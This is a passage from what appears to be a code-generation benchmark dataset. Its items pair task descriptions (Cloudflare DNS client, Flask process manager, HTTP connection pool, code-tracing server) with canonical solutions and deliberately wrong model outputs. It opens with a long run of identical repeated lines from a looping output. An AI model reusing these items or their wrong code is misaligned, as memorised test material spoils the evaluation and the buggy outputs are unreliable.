span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges"
  },
  {
    "Task_id": 14,
    "Instruction": "Task Description: Create a Python class to interact with Cloudflare's API for managing DNS records, including retrieving zone IDs, listing DNS records, and updating DNS records.\n\nClass Description: The CloudflareAPI class provides methods to interact with Cloudflare's API v4 for DNS management. It handles authentication, request/response processing, and includes caching for DNS records to optimize performance.\n\nAttributes:\n- ID: [str] - Cloudflare account email used for authentication\n- TOKEN: [str] - Cloudflare API key or bearer token for authentication\n- PROXY: [str] - Optional proxy server address\n- TTL: [int] - Time-to-live value for DNS records\n- SITE: [str] - Cloudflare API endpoint (default: \"api.cloudflare.com\")\n- _records_cache: [dict] - Internal cache for storing DNS records to reduce API calls\n\nMethods:\n- _request: [method](method: str, action: str, param: dict=None, **params: dict) -> dict - Internal method to make HTTP requests to Cloudflare API. Handles connection, authentication, request formatting, and response processing.\n- get_zone_id: [method](domain: str) -> str - Retrieves the zone ID for a given domain by checking progressively broader subdomains.\n- get_records: [method](zoneid: str, **conditions: dict) -> dict - Retrieves DNS records matching given conditions from a specified zone, using cache when possible.\n- update_record: [method](domain: str, value: str, record_type: str=\"A\") -> dict - Updates or creates a DNS record for the specified domain with the given value and record type.",
    "Canonical_solution": "from http.client import HTTPSConnection\nfrom urllib.parse import urlencode\nfrom json import loads as jsondecode, dumps as jsonencode\nfrom logging import debug, info, warning\n\nclass CloudflareAPI:\n    def __init__(self, auth_email=None, api_key=None, proxy=None, ttl=None):\n        self.ID = auth_email\n        self.TOKEN = api_key\n        self.PROXY = proxy\n        self.TTL = ttl\n        self.SITE = \"api.cloudflare.com\"\n        self._records_cache = {}\n\n    def _request(self, method, action, param=None, **params):\n        if param:\n            params.update(param)\n\n        params = dict((k, params[k]) for k in params if params[k] is not None)\n        info(\"%s/%s : %s\", self.SITE, action, params)\n        \n        if self.PROXY:\n            conn = HTTPSConnection(self.PROXY)\n            conn.set_tunnel(self.SITE, 443)\n        else:\n            conn = HTTPSConnection(self.SITE)\n\n        if method in ['PUT', 'POST', 'PATCH']:\n            params['content'] = str(params.get('content'))\n            params = jsonencode(params)\n        else:\n            if params:\n                action += '?' + urlencode(params)\n            params = None\n\n        if not self.ID:\n            headers = {\"Content-type\": \"application/json\",\n                      \"Authorization\": \"Bearer \" + self.TOKEN}\n        else:\n            headers = {\"Content-type\": \"application/json\",\n                      \"X-Auth-Email\": self.ID, \"X-Auth-Key\": self.TOKEN}\n\n        conn.request(method, '/client/v4/zones' + action, params, headers)\n        response = conn.getresponse()\n        res = response.read().decode('utf8')\n        conn.close()\n\n        if response.status < 200 or response.status >= 300:\n            warning('%s : error[%d]:%s', action, response.status, res)\n            raise Exception(res)\n        else:\n            data = jsondecode(res)\n            debug('%s : result:%s', action, data)\n            if not data:\n                raise Exception(\"Empty Response\")\n            elif data.get('success'):\n                return data.get('result', [{}])\n            else:\n                raise Exception(data.get('errors', [{}]))\n\n    def get_zone_id(self, domain):\n        zoneid = None\n        domain_slice = domain.split('.')\n        index = 2\n        while (not zoneid) and (index <= len(domain_slice)):\n            zones = self._request('GET', '', name='.'.join(domain_slice[-index:]))\n            zone = next((z for z in zones if domain.endswith(z.get('name'))), None)\n            zoneid = zone and zone['id']\n            index += 1\n        return zoneid\n\n    def get_records(self, zoneid, **conditions):\n        cache_key = zoneid + \"_\" + conditions.get('name', \"\") + \"_\" + conditions.get('type', \"\")\n        if cache_key not in self._records_cache:\n            self._records_cache[cache_key] = {}\n            data = self._request('GET', '/' + zoneid + '/dns_records', per_page=100, **conditions)\n            if data:\n                for record in data:\n                    self._records_cache[cache_key][record['id']] = {\n                        'id': record['id'],\n                        'type': record['type'],\n                        'name': record['name'],\n                        'content': record['content'],\n                        'proxied': record['proxied'],\n                        'ttl': record['ttl']\n                    }\n\n        records = {}\n        for (zid, record) in self._records_cache[cache_key].items():\n            for (k, value) in conditions.items():\n                if record.get(k) != value:\n                    break\n            else:\n                records[zid] = record\n        return records\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        zoneid = self.get_zone_id(domain)\n        if not zoneid:\n            raise Exception(\"invalid domain: [ %s ] \" % domain)\n\n        records = self.get_records(zoneid, name=domain, type=record_type)\n        cache_key = zoneid + \"_\" + domain + \"_\" + record_type\n        result = {}\n\n        if records:\n            for (rid, record) in records.items():\n                if record['content'] != value:\n                    res = self._request('PUT', '/' + zoneid + '/dns_records/' + record['id'],\n                                      type=record_type, content=value, name=domain, \n                                      proxied=record['proxied'], ttl=self.TTL)\n                    if res:\n                        self._records_cache[cache_key][rid]['content'] = value\n                        result[rid] = res.get(\"name\")\n                    else:\n                        result[rid] = \"Update fail!\\n\" + str(res)\n                else:\n                    result[rid] = domain\n        else:\n            res = self._request('POST', '/' + zoneid + '/dns_records',\n                              type=record_type, name=domain, content=value, \n                              proxied=False, ttl=self.TTL)\n            if res:\n                self._records_cache[cache_key][res['id']] = res\n                result = res\n            else:\n                result = domain + \" created fail!\"\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport requests\nimport json\nimport time\n\nclass CloudflareAPI:\n    def __init__(self, ID, TOKEN, PROXY=None, TTL=1, SITE=\"api.cloudflare.com\"):\n        self.ID = ID\n        self.TOKEN = TOKEN\n        self.PROXY = PROXY\n        self.TTL = TTL\n        self.SITE = SITE\n        self._records_cache = {}\n\n    def _request(self, method, action, param=None, **params):\n        headers = {\n            \"X-Auth-Email\": self.ID,\n            \"X-Auth-Key\": self.TOKEN,\n            \"Content-Type\": \"application/json\"\n        }\n        if self.PROXY:\n            proxies = {\"http\": self.PROXY, \"https\": self.PROXY}\n        else:\n            proxies = None\n        url = \"https://{}.{}/client/v4/{}\".format(self.SITE, method, action)\n        if param:\n            data = json.dumps(param)\n        else:\n            data = None\n        response = requests.request(method, url, headers=headers, data=data, proxies=proxies)\n        if response.status_code == 200:\n            return response.json()\n        else:\n            raise Exception(\"Error: {}\".format(response.json()[\"errors\"][0][\"message\"]))\n\n    def get_zone_id(self, domain):\n        for i in range(len(domain.split(\".\")), 0, -1):\n            zone = \".\".join(domain.split(\".\")[i-1:])\n            try:\n                response = self._request(\"GET\", \"zones\", {\"name\": zone})\n                return response[\"result\"][0][\"id\"]\n            except Exception as e:\n                pass\n        raise Exception(\"Zone not found\")\n\n    def get_records(self, zoneid, **conditions):\n        if zoneid not in self._records_cache:\n            response = self._request(\"GET\", \"zones/{}/dns_records\".format(zoneid))\n            self._records_cache[zoneid] = response[\"result\"]\n        records = self._records_cache[zoneid]\n        for key, value in conditions.items():\n            records = [record for record in records if record[key] == value]\n        return records\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        zoneid = self.get_zone_id(domain)\n        records = self.get_records(zoneid, name=domain, type=record_type)\n        if records:\n            record = records[0]\n            record[\"content\"] = value\n            record[\"ttl\"] = self.TTL\n            response = self._request(\"PUT\", \"zones/{}/dns_records/{}\".format(zoneid, record[\"id\"]), record)\n        else:\n            record = {\n                \"type\": record_type,\n                \"name\": domain,\n                \"content\": value,\n                \"ttl\": self.TTL\n            }\n            response = self._request(\"POST\", \"zones/{}/dns_records\".format(zoneid), record)\n        return response\n```"
  },
  {
    "Task_id": 143,
    "Instruction": "Task Description: Create a Flask-based HTTP server that manages and controls multiple learner and collector processes, allowing dynamic scaling of these processes through API calls.\n\nClass Description: FlaskOperatorServer is a class that wraps a Flask application to provide RESTful API endpoints for managing learner and collector process replicas. It interacts with a Creator instance to handle the actual process management.\n\nAttributes:\n- app: Flask - The Flask application instance\n- creator: Creator - The process manager that handles learner and collector instances\n- host: str - The host address where the server will run\n- port: int - The port number where the server will listen\n- api_version: str - The version prefix for API endpoints\n\nMethods:\n- __init__(creator, host: str, port: int, api_version: str = 'v1alpha1') -> None - Initializes the Flask server with process manager, host, port, and API version. Sets up route handlers.\n- run() -> None - Starts the Flask application server on the specified host and port.\n- post_replicas() -> dict - Handles POST requests to set the desired number of replicas (route: /{api_version}/replicas). Returns a response dictionary.\n- get_replicas() -> dict - Handles GET requests to retrieve current replica information (route: /{api_version}/replicas). Returns a response dictionary with current resources.",
    "Canonical_solution": "from flask import Flask, request\nimport json\nfrom threading import Thread\nfrom queue import Queue\n\nclass Creator:\n    def __init__(self, learner_addr, collector_addr):\n        self.learner_addr = learner_addr\n        self.collector_addr = collector_addr\n        self.collector_demand = Queue()\n        self.learner_demand = Queue()\n        self.learners = {}\n        self.collectors = {}\n        self.end_flag = False\n\n    def set_target_source(self, learner_target, collector_target):\n        self.collector_demand.put(collector_target)\n        self.learner_demand.put(learner_target)\n\n    def start(self):\n        while not self.end_flag:\n            if self.learner_demand.empty() and self.collector_demand.empty():\n                continue\n            else:\n                learner_demand, collector_demand = None, None\n                if not self.learner_demand.empty():\n                    learner_demand = self.learner_demand.get()\n                if not self.collector_demand.empty():\n                    collector_demand = self.collector_demand.get()\n\n                for i in range(collector_demand):\n                    name, host, port = self.collector_addr[i]\n                    self.collectors[name] = NaiveCollector(host, port, prefix=DATA_PREFIX)\n                    self.collectors[name].start()\n                for i in range(learner_demand):\n                    name, host, port = self.learner_addr[i]\n                    self.learners[name] = NaiveLearner(host, port, prefix=DATA_PREFIX)\n                    self.learners[name].start()\n\n    def close(self):\n        self.end_flag = True\n        for t in self.learners.values():\n            t.close()\n        for t in self.collectors.values():\n            t.close()\n\n    @property\n    def current_resource(self):\n        collectors = {k: {} for k in self.collectors}\n        learners = {k: {} for k in self.learners}\n        return {\"collectors\": collectors, 'learners': learners}\n\nclass FlaskOperatorServer:\n    def __init__(self, creator, host: str, port: int, api_version: str = 'v1alpha1'):\n        self.app = Flask(__name__)\n        self.creator = creator\n        self.host = host\n        self.port = port\n        self.api_version = api_version\n        \n        @self.app.route('/{}/replicas'.format(self.api_version), methods=['POST'])\n        def post_replicas():\n            data = json.loads(request.data.decode())\n            collectors = data['collectors'][\"replicas\"]\n            learners = data['learners'][\"replicas\"]\n            self.creator.set_target_source(learners, collectors)\n            return {'success': True, 'code': 0, 'message': '', 'data': ''}\n\n        @self.app.route('/{}/replicas'.format(self.api_version), methods=['GET'])\n        def get_replicas():\n            data = json.loads(request.data.decode())\n            return {'success': True, 'code': 0, 'message': '', 'data': self.creator.current_resource}\n\n    def run(self):\n        self.app.run(host=self.host, port=self.port)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, request, jsonify\nfrom creator import Creator\n\nclass FlaskOperatorServer:\n    def __init__(self, creator, host: str, port: int, api_version: str = 'v1alpha1') -> None:\n        self.app = Flask(__name__)\n        self.creator = creator\n        self.host = host\n        self.port = port\n        self.api_version = api_version\n        self.app.add_url_rule(f'/{self.api_version}/replicas', 'post_replicas', self.post_replicas, methods=['POST'])\n        self.app.add_url_rule(f'/{self.api_version}/replicas', 'get_replicas', self.get_replicas, methods=['GET'])\n\n    def run(self) -> None:\n        self.app.run(host=self.host, port=self.port)\n\n    def post_replicas(self) -> dict:\n        replicas = request.json.get('replicas')\n        self.creator.set_replicas(replicas)\n        return jsonify({'message': f'Set {replicas} replicas'})\n\n    def get_replicas(self) -> dict:\n        resources = self.creator.get_resources()\n        return jsonify({'resources': resources})\n```"
  },
  {
    "Task_id": 16,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages HTTP connections to a server, handling connection creation, request sending, and response retrieval with support for retries, timeouts, and connection reuse.\n\nClass Description: HTTPConnectionPool is a connection pool manager for HTTP/HTTPS connections that provides efficient connection reuse and handles various network-related exceptions. It supports configurable timeouts, retries, and proxy settings.\n\nAttributes:\n- scheme: str - The URL scheme (http/https) for connections\n- host: str - The target server hostname\n- port: int - The target server port (optional)\n- timeout: Timeout - Connection and read timeout configuration\n- retries: Retry - Retry configuration for failed requests\n- proxy: str - Proxy server URL (optional)\n- proxy_headers: dict - Headers for proxy requests\n- conn_kw: dict - Additional connection parameters\n\nMethods:\n- __init__(host, port=None, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with configuration parameters\n- _new_conn() -> HTTPConnection - Creates and returns a new connection instance\n- _make_request(conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw) -> HTTPResponse - Sends an HTTP request through the given connection and returns the response\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, chunked=False, **response_kw) -> HTTPResponse - Main method to open a URL with retry and timeout handling, managing connection lifecycle",
    "Canonical_solution": "from socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .exceptions import (\n    EmptyPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProtocolError,\n    ProxyError,\n    ReadTimeoutError,\n    SSLError,\n)\nfrom .util.retry import Retry\nfrom .util.timeout import Timeout\nfrom .util.url import parse_url\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = Timeout.from_float(timeout) if not isinstance(timeout, Timeout) else timeout\n        self.retries = retries if retries is not None else Retry.DEFAULT\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            **self.conn_kw\n        )\n\n    def _make_request(\n        self, conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw\n    ):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            if chunked:\n                conn.request_chunked(method, url, **httplib_request_kw)\n            else:\n                conn.request(method, url, **httplib_request_kw)\n\n        except (BrokenPipeError, IOError) as e:\n            if getattr(e, 'errno', None) not in {errno.EPIPE, errno.ESHUTDOWN, errno.EPROTOTYPE}:\n                raise\n\n        read_timeout = timeout_obj.read_timeout\n        if getattr(conn, 'sock', None):\n            if read_timeout == 0:\n                raise ReadTimeoutError(\n                    self, url, f\"Read timed out. (read timeout={read_timeout}\"\n                )\n            conn.sock.settimeout(read_timeout)\n\n        try:\n            httplib_response = conn.getresponse()\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            self._raise_timeout(err=e, url=url, timeout_value=read_timeout)\n            raise\n\n        return httplib_response\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        release_conn=None,\n        chunked=False,\n        **response_kw\n    ):\n        parsed_url = parse_url(url)\n        if headers is None:\n            headers = self.headers\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries, redirect=redirect, default=self.retries)\n\n        if assert_same_host and not self.is_same_host(url):\n            raise HostChangedError(self, url, retries)\n\n        conn = None\n        release_this_conn = release_conn\n        clean_exit = False\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._new_conn()\n            conn.timeout = timeout_obj.connect_timeout\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers,\n                chunked=chunked,\n            )\n\n            clean_exit = True\n\n        except EmptyPoolError:\n            clean_exit = True\n            release_this_conn = False\n            raise\n\n        except (\n            SocketError,\n            ProtocolError,\n            MaxRetryError,\n            SSLError,\n            ProxyError,\n        ) as e:\n            clean_exit = False\n            if isinstance(e, (SocketError, ProtocolError)):\n                e = ProtocolError(\"Connection aborted.\", e)\n\n            retries = retries.increment(\n                method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]\n            )\n            retries.sleep()\n            err = e\n\n        finally:\n            if not clean_exit:\n                conn = conn and conn.close()\n                release_this_conn = True\n\n            if release_this_conn:\n                self._put_conn(conn)\n\n        if not conn:\n            return self.urlopen(\n                method,\n                url,\n                body,\n                headers,\n                retries,\n                redirect,\n                assert_same_host,\n                timeout=timeout,\n                pool_timeout=pool_timeout,\n                release_conn=release_conn,\n                chunked=chunked,\n                **response_kw\n            )\n\n        return httplib_response",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport socket\nimport time\nimport warnings\nfrom collections import namedtuple\nfrom contextlib import contextmanager\nfrom functools import partial\nfrom http.client import HTTPConnection, HTTPSConnection, HTTPResponse\nfrom typing import Any, Callable, Dict, Optional, Tuple, Type, Union\n\nfrom .exceptions import (\n    ConnectTimeoutError,\n    HTTPError,\n    MaxRetryError,\n    ProxyError,\n    ReadTimeoutError,\n    SSLError,\n    Timeout,\n    UnrewindableBodyError,\n)\nfrom .poolmanager import PoolManager\nfrom .response import HTTPResponse\nfrom .util import urlsplit\n\nDefaultConnectionCls = HTTPConnection\n\ntry:\n    import ssl\n    DefaultConnectionCls = HTTPSConnection\nexcept ImportError:\n    pass\n\nTimeout = namedtuple('Timeout', ['connect', 'read'])\n\nDefaultTimeout = Timeout(connect=10, read=10)\n\nRetry = namedtuple('Retry', ['total', 'connect', 'read', 'status'])\n\nDefaultRetry = Retry(total=3, connect=3, read=3, status=3)\n\nclass HTTPConnectionPool(PoolManager):\n    scheme = 'http'\n\n    def __init__(self, host, port=None, timeout=DefaultTimeout, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries or DefaultRetry\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n        self.pool = Queue(maxsize=maxsize, block=block)\n        self.headers = headers or {}\n        self.num_connections = 0\n        self.num_requests = 0\n\n    def _new_conn(self):\n        self.num_connections += 1\n        return self._create_connection()\n\n    def _create_connection(self):\n        if self.proxy:\n            return self._create_proxy_connection()\n        else:\n            return self._create_direct_connection()\n\n    def _create_direct_connection(self):\n        return self._create_connection_helper(\n            self.host,\n            self.port,\n            self.timeout.connect,\n            **self.conn_kw\n        )\n\n    def _create_proxy_connection(self):\n        return self._create_connection_helper(\n            self.proxy,\n            self.proxy_port,\n            self.timeout.connect,\n            **self.conn_kw\n        )\n\n    def _create_connection_helper(self, host, port, timeout, **kw):\n        conn = self.ConnectionCls(host, port, timeout=timeout, **kw)\n        return conn\n\n    def _get_conn(self, timeout=None):\n        conn = self.pool.get(block=True, timeout=timeout)\n        return conn\n\n    def _put_conn(self, conn):\n        self.pool.put(conn)\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, chunked=False, **response_kw):\n        retries = retries or self.retries\n        if retries.total == 0:\n            raise ValueError(\"Retry total cannot be zero.\")\n\n        retries = retries._replace(total=retries.total - 1)\n        retries = retries._replace(connect=retries.connect - 1)\n        retries = retries._replace(read=retries.read - 1)\n        retries = retries._replace(status=retries.status - 1)\n\n        if timeout is _Default:\n            timeout = self.timeout\n\n        if pool_timeout is _Default:\n            pool_timeout = self.pool_timeout\n\n        conn = None\n        start_pool_timeout = None\n        try:\n            conn = self._get_conn(timeout=pool_timeout)\n            if conn is None:\n                raise EmptyPoolError()\n\n            start_pool_timeout = time.time()\n            conn.timeout = timeout.connect\n            conn.sock.settimeout(timeout.connect)\n\n            for i in range(retries.connect + 1):\n                try:\n                    conn.request(method, url, body, headers or {}, chunked=chunked)\n                    break\n                except (socket.timeout, ConnectTimeoutError) as exc:\n                    if i + 1 == retries.connect:\n                        raise ConnectTimeoutError(\n                            \"Connect call failed after {} retries.\".format(retries.connect),\n                            exc\n                        )\n                    time.sleep(min((2 ** i) * 0.1, 1))\n                except (socket.error, SSLError) as exc:\n                    if i + 1 == retries.connect:\n                        raise ConnectTimeoutError(\n                            \"Connect call failed after {} retries.\".format(retries.connect),\n                            exc\n                        )\n                    time.sleep(min((2 ** i) * 0.1, 1))\n                except Exception as exc:\n                    if i + 1 == retries.connect:\n                        raise ConnectTimeoutError(\n                            \"Connect call failed after {} retries.\".format(retries.connect),\n                            exc\n                        )\n                    time.sleep(min((2 ** i) * 0.1, 1))\n            else:\n                raise MaxRetryError(\"Max retries exceeded with url: {}\".format(url))\n\n            for i in range(retries.read + 1):\n                try:\n                    resp = conn.getresponse()\n                    break\n                except (socket.timeout, ReadTimeoutError) as exc:\n                    if i + 1 == retries.read:\n                        raise ReadTimeoutError(\n                            \"Read timed out. (read timeout={})\".format(timeout.read),\n                            exc\n                        )\n                    time.sleep(min((2 ** i) * 0.1, 1))\n                except Exception as exc:\n                    if i + 1 == retries.read:\n                        raise ReadTimeoutError(\n                            \"Read timed out. (read timeout={})\".format(timeout.read),\n                            exc\n                        )\n                    time.sleep(min((2 ** i) * 0.1, 1))\n            else:\n                raise MaxRetryError(\"Max retries exceeded with url: {}\".format(url))\n\n            if resp.status in (301, 302, 303, 307, 308) and redirect:\n                location = resp.getheader('Location')\n                if location is None:\n                    raise HTTPError(\n                        \"Redirected but the response is missing a Location: header.\"\n                    )\n                return self.urlopen(\n                    method,\n                    location,\n                    body=body,\n                    headers=headers,\n                    retries=retries,\n                    redirect=False,\n                    assert_same_host=assert_same_host,\n                    timeout=timeout,\n                    pool_timeout=pool_timeout,\n                    release_conn=release_conn,\n                    chunked=chunked,\n                    **response_kw\n                )\n\n            return self._make_request(\n                conn,\n                method,\n                url,\n                body=body,\n                headers=headers,\n                retries=retries,\n                redirect=redirect,\n                assert_same_host=assert_same_host,\n                timeout=timeout,\n                pool_timeout=pool_timeout,\n                release_conn=release_conn,\n                chunked=chunked,\n                **response_kw\n            )\n        finally:\n            if conn:\n                self._put_conn(conn)\n            if start_pool_timeout is not None:\n                self.num_requests += 1\n                self.num_connections += 1\n                self.pool_timeout = max(\n                    0, pool_timeout - (time.time() - start_pool_timeout)\n                )\n```\n"
  },
  {
    "Task_id": 164,
    "Instruction": "Task Description: Create a Python function that sets up a real-time code tracing and visualization system using Flask to serve a web interface for monitoring execution patterns.\n\nFunction Description: The `trace` function establishes a web-based visualization tool that tracks and displays Python code execution in real-time. It creates a Flask web server that shows which lines of code are being executed most frequently, with features like heatmap visualization and stack trace inspection. The function uses Python's sys.settrace() mechanism to monitor execution and organizes the data for web display.\n\nInput:\n- files: [Optional callable] - A function to filter which files should be traced (default: None)\n- port: [int] - Port number for the web server (default: 9999)\n- host: [str] - Host address for the server (default: '127.0.0.1')\n- browser: [bool] - Whether to automatically open browser (default: False)\n- daemon: [bool] - Whether to run server as daemon thread (default: False)\n\nOutput:\n- None (The function runs indefinitely, serving the web interface and collecting trace data)\n\nThe function:\n1. Sets up tracing for the calling frame and specified files\n2. Creates a Flask web server with multiple routes for visualization\n3. Starts a background thread for the web server\n4. Configures sys.settrace() to collect execution data\n5. Optionally opens a browser window to display the visualization",
    "Canonical_solution": "import inspect\nimport logging\nimport sys\nimport threading\nimport webbrowser\nfrom collections import defaultdict, deque, Counter\nfrom functools import lru_cache\nfrom itertools import islice, takewhile\nfrom flask import Flask, render_template, jsonify, url_for, request\n\ndef trace(\n        files=None,\n        port=9999,\n        host='127.0.0.1',\n        browser=False,\n        daemon=False,\n):\n    calling_frame = inspect.currentframe().f_back\n    calling_file = calling_frame.f_code.co_filename\n\n    @lru_cache(maxsize=None)\n    def include_file(path):\n        try:\n            return path == calling_file or files(path)\n        except Exception:\n            return False\n\n    thread_ident = threading.get_ident()\n    queues = defaultdict(lambda: deque(maxlen=2 ** 10))\n    totals = defaultdict(Counter)\n\n    app = Flask(__name__)\n\n    host_is_local = host in [\"127.0.0.1\", \"localhost\"]\n    if host_is_local:\n        app.config[\"SERVER_NAME\"] = \"{host}:{port}\".format(host=host, port=port)\n\n    @app.route('/')\n    def index():\n        return render_template('index.html', files=sorted(queues.keys()))\n\n    @app.route('/file/')\n    def file_view():\n        return render_template(\"file.html\", **file_table_context())\n\n    def file_table_context():\n        filename = request.args['filename']\n        source = Source.for_filename(filename)\n        queue = queues[filename]\n\n        highlighted = highlight_ranges(source, frames_matching(filename))\n        highlighted_lines = list(enumerate(highlighted.splitlines()))\n        \n        counters = [\n            queue_counter(queue, 2 ** i)\n            for i in range(10 + 1)\n        ]\n\n        ratios = [\n            [\n                counter[i + 1] / min(2 ** c, len(queue) or 1)\n                * (c + 1) / 10\n                for c, counter in enumerate(counters)\n            ]\n            for i, _ in highlighted_lines\n        ]\n\n        max_ratio = max(map(max, ratios)) or 1\n\n        rows = [\n            (\n                i + 1,\n                totals[filename][i + 1] or '',\n                reversed([\n                    int(round(ratio / max_ratio * 100))\n                    for ratio in ratios[i]\n                ]),\n                line,\n            )\n            for i, line in highlighted_lines\n        ]\n\n        return dict(\n            rows=rows,\n            zip=zip,\n            lightnesses=[int((i + 1) * 100 / (10 + 1)) for i in range(10 + 1)],\n            filename=filename,\n            highlighted=highlighted,\n        )\n\n    @app.route('/table/')\n    def file_table_view():\n        return render_template('file_table.html', **file_table_context())\n\n    def current_frame():\n        return sys._current_frames()[thread_ident]\n\n    def frames_matching(filename):\n        frame = current_frame()\n        while frame:\n            if frame.f_code.co_filename == filename:\n                yield frame\n            frame = frame.f_back\n\n    @app.route('/stacktrace/')\n    def stacktrace():\n        def gen():\n            frame = current_frame()\n            while frame:\n                code = frame.f_code\n                filename = code.co_filename\n                name = Source.for_frame(frame).code_qualname(code)\n                yield (\n                    filename,\n                    frame.f_lineno,\n                    name,\n                    highlight_stack_frame(frame),\n                    include_file(filename)\n                )\n                frame = frame.f_back\n\n        return jsonify(list(takewhile(\n            lambda entry: not (\n                    'heartrate' in entry[0]\n                    and entry[2].endswith(trace_func.__name__)),\n            list(gen())[::-1]\n        )))\n\n    threading.Thread(\n        target=lambda: app.run(\n            debug=False,\n            host=host,\n            port=port,\n        ),\n        daemon=daemon,\n    ).start()\n\n    def trace_func(frame, event, _arg):\n        filename = frame.f_code.co_filename\n        if event == \"call\":\n            if include_file(filename):\n                return trace_func\n\n        elif event == \"line\":\n            lineno = frame.f_lineno\n            queues[filename].append(lineno)\n            totals[filename][lineno] += 1\n            Source.lazycache(frame)\n\n    calling_frame.f_trace = trace_func\n    sys.settrace(trace_func)\n    \n    if browser and host_is_local:\n        with app.app_context():\n            url = url_for(\n                'file_view',\n                filename=calling_file,\n            )\n        webbrowser.open_new_tab(url)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
